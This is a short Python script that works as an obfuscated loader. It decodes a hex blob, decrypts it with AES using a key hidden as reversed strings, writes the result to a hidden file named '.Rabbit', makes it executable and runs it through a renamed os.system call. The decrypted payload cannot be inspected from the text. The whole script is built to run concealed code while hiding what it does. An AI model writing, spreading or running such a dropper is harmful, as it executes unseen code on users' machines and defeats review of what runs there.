from binascii import unhexlify as sus
from os import system as RABBİT
# key:
kp1 = "noLetyB23AsIsihT"[::-1]
kp2 = "!!yeKnoitpyrcnEg"[::-1]
key = kp1 + kp2
Code = '.Rabbit'
rabitpython = '894abe06ebc0d89454ef151d0265e9a8d292f349e1f6b18de2e367a9cea9c30afcf69c72124824f674510f229a7b0bb2a05494fec1a548e1a44683a56d85613388aecb700e668214596d520cae1043d2a8417cb1905956fade5926489e7033606505979c652b89517370802b454e92ba842cdab4b4aebaf3cc7ad438247c3287514bbc3cd20c1147366dd51adf85cca7df0bf11a3ad68e3e7f7d6fff6c74250a'
with open(Code, 'wb') as HA:
    HA.write(sus(rabitpython))
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
with open(Code, 'rb') as f:
    enc = f.read()
iv = enc[:16]
ciphertext = enc[16:]
cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
with open(Code, 'wb') as f:
    f.write(plaintext)
import os, stat
os.chmod(Code, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)
RABBİT('python ' + Code)
